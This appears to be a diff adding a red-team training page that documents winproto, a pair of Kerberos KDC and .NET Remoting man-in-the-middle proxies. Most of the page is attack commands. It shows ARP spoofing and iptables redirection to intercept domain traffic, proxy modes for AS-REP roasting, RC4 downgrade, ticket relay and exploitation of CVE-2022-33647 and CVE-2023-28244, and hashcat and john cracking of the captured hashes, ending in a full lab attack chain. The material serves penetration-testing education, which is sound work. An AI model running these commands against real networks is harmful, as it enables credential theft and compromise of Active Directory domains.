@@ -1,0 +1,215 @@
+---
+layout: training-page
+title: "winproto — Kerberos KDC & .NET Remoting MITM Proxies — Red Team Academy"
+module: "Active Directory"
+tags:
+  - winproto
+  - kerberos
+  - kdc-proxy
+  - nmf-proxy
+  - mitm
+  - kerberoasting
+  - active-directory
+  - windows-protocols
+  - cve-2022-33647
+  - cve-2023-28244
+page_key: "ad-winproto"
+render_with_liquid: false
+---
+
+# winproto — Kerberos KDC & .NET Remoting MITM Proxies
+
+winproto is a pair of Rust-based transparent proxy tools for intercepting and manipulating Windows protocol traffic. **kdc-proxy** sits between a Kerberos client and its KDC, enabling passive ticket capture, active roasting, relay attacks, and exploitation of Kerberos CVEs. **nmf-proxy** intercepts MC-NMF (.NET Remoting) traffic, enabling MITM on .NET remoting channels for credential capture and protocol analysis.
+
+## Install
+
+```
+# Build from source (Rust required):
+git clone https://github.com/sinacr/winproto
+cd winproto
+
+# Build kdc-proxy:
+cd kdc-proxy
+cargo build --release
+# Binary: target/release/kdc-proxy
+
+# Build nmf-proxy:
+cd ../nmf-proxy
+cargo build --release
+# Binary: target/release/nmf-proxy
+
+# Pre-built binaries may be available in the Releases tab on GitHub
+```
+
+## kdc-proxy — Kerberos KDC MITM
+
+kdc-proxy is a transparent TCP proxy that intercepts Kerberos AS-REQ and TGS-REQ messages between clients and the KDC (port 88). Once you position it in the traffic path (via ARP spoofing, DNS manipulation, or network redirection), it can passively capture tickets, actively roast them, or perform relay attacks.
+
+### Positioning the Proxy
+
+```
+# kdc-proxy sits between client and KDC:
+# [Client] → port 88 → [kdc-proxy] → port 88 → [real KDC]
+
+# Syntax:
+kdc-proxy [LISTEN_ADDR]:[PORT] [KDC_ADDR]:[PORT] --mode [MODE]
+
+# Example — listen on 0.0.0.0:88, forward to real KDC at 192.168.56.102:88:
+kdc-proxy 0.0.0.0:88 192.168.56.102:88 --mode log-only
+
+# Common ways to redirect client Kerberos traffic to your proxy:
+# 1. ARP poison: spoof the KDC's IP to redirect clients to your machine
+#    arpspoof -i eth0 -t [client_ip] [kdc_ip]
+# 2. DNS: change KDC's A record to your IP (via DNSChef or DHCP)
+# 3. Rogue DC registration (domain joined machine)
+# 4. iptables REDIRECT on a compromised intermediate host:
+#    iptables -t nat -A PREROUTING -p tcp --dport 88 -j REDIRECT --to-port 88
+#    (combined with routing the real KDC traffic out a different path)
+```
+
+### Modes of Operation
+
+```
+# log-only — capture and log Kerberos traffic without modification:
+# Shows AS-REQ/AS-REP/TGS-REQ/TGS-REP messages, usernames, SPNs
+kdc-proxy 0.0.0.0:88 192.168.56.102:88 --mode log-only
+
+# roast-passive — capture AS-REP hashes for offline cracking (AS-REP roasting):
+# Intercepts AS-REP messages for accounts with pre-auth disabled
+# Extracts the encrypted part (hash) for hashcat/john cracking
+kdc-proxy 0.0.0.0:88 192.168.56.102:88 --mode roast-passive
+# Hashes saved to: kdc-proxy-hashes.txt (hashcat format 18200)
+# Crack: hashcat -m 18200 kdc-proxy-hashes.txt rockyou.txt
+
+# roast-active — AS-REP roasting of ALL users (not just pre-auth disabled):
+# Injects a modified AS-REQ for each passing authentication attempt
+# Requests RC4-HMAC encrypted tickets instead of AES (weaker = faster crack)
+kdc-proxy 0.0.0.0:88 192.168.56.102:88 --mode roast-active
+
+# downgrade-pa — downgrade pre-authentication encryption:
+# Forces PA-ENC-TIMESTAMP to use RC4 instead of AES
+# Results in RC4-encrypted hashes (faster to crack)
+kdc-proxy 0.0.0.0:88 192.168.56.102:88 --mode downgrade-pa
+```
+
+### Relay and CVE Modes
+
+```
+# ritm (Relay-in-the-Middle) — Kerberos relay attack:
+# Intercepts TGS tickets and relays them to other services
+# Useful when client authenticates with tickets you can reuse
+kdc-proxy 0.0.0.0:88 192.168.56.102:88 --mode ritm
+
+# CVE-2022-33647 — Kerberos RC4-MD4 downgrade vulnerability:
+# Exploits improper RC4-MD4 HMAC key derivation
+# Allows forging tickets that the KDC accepts
+# Affects unpatched Windows Server 2008 R2 through Server 2019
+kdc-proxy 0.0.0.0:88 192.168.56.102:88 --mode CVE-2022-33647
+
+# CVE-2023-28244 — Kerberos RC4 privilege escalation:
+# Exploits RC4 session key handling to escalate privileges
+# Intercepts and modifies PAC data in Kerberos tickets
+kdc-proxy 0.0.0.0:88 192.168.56.102:88 --mode CVE-2023-28244
+
+# For CVE modes — target must be unpatched:
+# CVE-2022-33647 patched: KB5021654 (Nov 2022 Patch Tuesday)
+# CVE-2023-28244 patched: KB5025229 (Apr 2023 Patch Tuesday)
+```
+
+### Cracking Captured Hashes
+
+```
+# kdc-proxy saves captured hashes in hashcat format.
+# View captured hashes:
+cat kdc-proxy-hashes.txt
+# Format: $krb5asrep$23$username@DOMAIN.COM:...hash...
+
+# Crack with hashcat (mode 18200 = AS-REP roast, Kerberos 5):
+hashcat -m 18200 kdc-proxy-hashes.txt /usr/share/wordlists/rockyou.txt
+
+# With rules for better coverage:
+hashcat -m 18200 kdc-proxy-hashes.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+
+# If roast-active mode captured TGS hashes (Kerberoasting, mode 13100):
+hashcat -m 13100 kdc-proxy-hashes.txt /usr/share/wordlists/rockyou.txt
+
+# With john:
+john --format=krb5asrep kdc-proxy-hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+## nmf-proxy — MC-NMF / .NET Remoting MITM
+
+nmf-proxy intercepts MC-NMF (Microsoft .NET Message Framing) traffic used by .NET Remoting — the legacy .NET inter-process communication protocol. By positioning this proxy in the traffic path, you can capture credentials and examine .NET remoting calls between applications. It is relevant in older enterprise applications and WCF services using netTcpBinding.
+
+```
+# MC-NMF is the transport layer for:
+# - .NET Remoting (legacy .NET 1.x-3.x IPC)
+# - WCF netTcpBinding (Windows Communication Foundation)
+# - Default port: 8080 or application-specific
+
+# Run nmf-proxy between client and server:
+# Syntax:
+nmf-proxy [LISTEN_ADDR]:[PORT] [TARGET_ADDR]:[PORT]
+
+# Example — intercept .NET remoting on port 8080:
+nmf-proxy 0.0.0.0:8080 192.168.1.20:8080
+
+# What nmf-proxy captures:
+# - Authentication credentials (NTLM/Kerberos tokens in NegotiateStream)
+# - Serialized .NET objects in request/response bodies
+# - Method names and parameters being called remotely
+# - Can reveal hard-coded credentials or sensitive data in RPC calls
+
+# Redirect client traffic to your proxy:
+# Same techniques as kdc-proxy: ARP poison, DNS, iptables REDIRECT
+
+# Look for MC-NMF services:
+# Common locations: WCF services, legacy .NET apps, enterprise middleware
+# Port scan + service banner grab:
+nmap -p 8080,808,9000 --script banner 192.168.1.0/24
+
+# Identify NMF magic bytes in captured traffic:
+# NMF Version Record starts with: 0x56 0x01 (version major=1)
+```
+
+## Lab Setup
+
+```
+# Minimal test lab for kdc-proxy:
+# - Domain Controller: 192.168.56.102 (running AD + KDC)
+# - Client machine: 192.168.56.103 (domain joined)
+# - Attack machine: 192.168.56.104 (running kdc-proxy)
+
+# On attack machine — ARP spoof to intercept client → KDC traffic:
+# Install arpspoof: apt install dsniff
+arpspoof -i eth0 -t 192.168.56.103 192.168.56.102 &  # tell client: KDC is us
+arpspoof -i eth0 -t 192.168.56.102 192.168.56.103 &  # tell KDC: client is us
+
+# Enable IP forwarding so traffic flows through us:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Redirect port 88 traffic to our proxy listener:
+iptables -t nat -A PREROUTING -p tcp --dport 88 \
+  -s 192.168.56.103 -j REDIRECT --to-port 8899
+
+# Run kdc-proxy on our custom port forwarding to real KDC:
+kdc-proxy 0.0.0.0:8899 192.168.56.102:88 --mode roast-active
+
+# Force client to authenticate (trigger Kerberos traffic):
+# On the client: net use \\\\dc01\\share /user:DOMAIN\\username password
+# OR: just wait for background Kerberos renewals
+
+# Check captured hashes:
+cat kdc-proxy-hashes.txt
+```
+
+## Resources
+
+- winproto — `github.com/sinacr/winproto`
+- CVE-2022-33647 — `msrc.microsoft.com/update-guide/vulnerability/CVE-2022-33647`
+- CVE-2023-28244 — `msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28244`
+- Related: [Kerberoasting](/active-directory/kerberoasting/)
+- Related: [AS-REP Roasting](/active-directory/asreproasting/)
+- Related: [NTLM Relay Attacks](/active-directory/ntlm-relay/)
+- Related: [DNSChef — DNS Proxy](/recon/dnschef/)
